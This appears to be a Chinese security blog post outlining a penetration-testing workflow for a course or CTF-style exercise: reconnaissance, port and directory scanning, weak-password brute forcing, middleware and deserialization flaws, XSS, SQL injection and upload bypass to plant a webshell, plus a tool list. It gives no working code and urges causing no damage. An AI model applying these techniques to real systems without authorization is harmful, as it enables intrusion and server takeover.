+<p>选择的目标若未找到漏洞，可只记录信息搜集过程，并且将可能存在漏洞点的（你认为不安全的地方）标注出来。<br>可多选择几个目标进行尝试，但在渗透过程中要进行多方面考虑，尝试每一个可能的攻击面，若找到漏洞甚至getshell不得对系统进行任何破坏，一切也测试为目的。渗透过程中也要注意保护系统，对服务器的扫描等行为要确保不会影响服务。</p>
+<p>详细记录整个过程，把每个值得记录的地方都写下来。并向相关漏洞平台上报漏洞</p>
+<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>在拿到一个网站的时候，首先是对这个网站要有一个比较全面的了解，就是对这个网站进行信息收集。在信息收集阶段，一般要收集这个网站的IP地址信息，是否使用CDN，使用哪种语言开发，中间件是什么</p>
+<h4 id="IP端口扫描"><a href="#IP端口扫描" class="headerlink" title="IP端口扫描"></a>IP端口扫描</h4><p>端口发现的目的是查看是否有高危端口，比如135/445/3389或者常见的数据库端口等 比如，如果存在445端口，我们就可以测试是否存在永恒之蓝漏洞，在端口发现阶段，如果存在像7001或者8080这样的端口的情况，我们就要看下这些端口是在运行哪些服务</p>
+<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>对网站目录的扫描，我们可以观察是否存在网站后台管理 如果存在的话，可以尝试弱口令登录 如果尝试多次登录没有锁定，也可以尝试简单的口令爆破，因为现场测试时间有限，长时间的爆破是不可能的 </p>
+<h4 id="主机层漏洞"><a href="#主机层漏洞" class="headerlink" title="主机层漏洞"></a>主机层漏洞</h4><p>主机层的漏洞就是看端口开放情况，判断开放的服务，然后测试是否有漏洞，比如溢出漏洞，反序列化漏洞</p>
+<h4 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h4><p>中间件漏洞比较简单，像weblogic反序列化，还有就是使用中间件部署web木马，直接拿服务器权限另外还有一些框架的漏洞，比如Struts2的漏洞。这些漏洞都是可以直接使用工具进行检测的</p>
+<h4 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h4><p>xss漏洞，sql注入漏洞，还有一些越权等逻辑漏洞</p>
+<p>比如XSS漏洞，一般存在于搜索框中或者注册信息等地方<br>当发现有搜索框或者注册信息或者发布消息，需要输入内容，且输入消息会返回到页面让读者查看的时候，就需要测试一下是否存在xss漏洞<br>当然，我们还需要联想到，当我们看到搜索框的时候，我们需要测试一下搜索的内容是否是从数据库中去调取的，如果是的话，可能也会存在SQL注入的可能<br>上传漏洞一般配合解析漏洞使用，如果服务器端与前端都没有对上传格式进行限制，那么我们可以直接上传webshell，拿服务器权限<br>如果网站对上传格式有限制，我们需要抓包对文件类型进行修改，然后上传，验证是前端还是服务器端做的限制，如果是前端做的限制就可以改包上传了，上传后注意观察返回包的内容，是否有文件上传的路径与上传后的文件名<br>当网站是使用iis6.0搭建的网站时可以使用IIS6.0特有的两个文件解析漏洞进行测试</p>
+<p>SQL注入漏洞常见的存在于带参数链接或者POST数据包 类似于xxx.jsp?id=xxx<br>或者像登录时使用POST请求方式传输用户名和密码，至于验证是否存在SQL注入</p>
+<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>在测试的过程中，一般会使用到<code>SQLmap</code>，<code>wvs</code>，<code>kali</code>，<code>k8</code>，<code>菜刀</code>，<code>webshell</code>，<code>御剑</code>，<code>Nessus</code>等还有一些反序列化的检测工具和脚本，这些可以在GitHub上，或其他地方找到<br>端口扫描工具可以使用<code>nmap</code>，Windows下的zmap（其实就是nmap），常用参数可以上网搜一下，比较详细<br>远程连接工具可以使用<code>putty</code>，或者<code>crt</code><br>数据库连接工具可以使用<code>Navicat</code></p>
+<h4 id="强调"><a href="#强调" class="headerlink" title="强调"></a>强调</h4><p>渗透的思路的话，一般就是信息收集，整理，利用，测试（验证），获取权限，到此为止，<strong>禁止拿数据或者对用户网络造成影响</strong><br>剩下的就是对工具的熟练使用以及丰富自己的渗透思路，能力大的可以从代码层面去发现漏洞，说不定会有意外收获</p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://danie1233.github.io" rel="external nofollow noreferrer">Danie1</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://danie1233.github.io/2019/08/05/CTF%E5%85%A5%E5%9D%91/">https://danie1233.github.io/2019/08/05/CTF%E5%85%A5%E5%9D%91/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://danie1233.github.io" target="_blank">Danie1</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2019/08/20/DDCTF-web1/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="DDCTF-web1">
+                        
+                        <span class="card-title">DDCTF-web1</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            DDCTF-WEB1
+首先观察链接发现可能存在文件包含，且jpg参数是经过一次base16，两次base64加密后的，所以构造payload读取index.php
+
+base64解码后得到index.php
+&lt;?php
+/*
+ * h
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2019-08-20
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2018/08/18/SEEDLAB_Packet%20Sniffing%20and%20Spoofing%20Lab/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="SEEDLAB_Packet Sniffing and Spoofing Lab">
+                        
+                        <span class="card-title">SEEDLAB_Packet Sniffing and Spoofing Lab</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            SEEDLAB_Packet Sniffing and Spoofing Lab
+
+Capture only the ICMP packet#-*-coding:utf-8-*-
+from scapy.all import *
+
+
+
+def
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2018-08-18
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/python/" class="post-category">
+                                    python
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/python/">
+                        <span class="chip bg-color">python</span>
+                    </a>
+                    
+                    <a href="/tags/socket/">
+                        <span class="chip bg-color">socket</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+    
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+    <footer class="page-footer bg-color">
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2019</span>
+            <a href="https://danie1233.github.io" target="_blank">Danie1</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/Danie1233" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:danie1_0@163.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+    <script type="text/javascript" color="0,0,255"
+        pointColor="0,0,255" opacity='0.7'
+        zIndex="-1" count="99"
+        src="/libs/background/canvas-nest.js"></script>
+    
+
+    
+    
+    <script type="text/javascript" size="150" alpha='0.6'
+        zIndex="-1" src="/libs/background/ribbon.min.js" async="async"></script>
+    
+
+    
+    
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
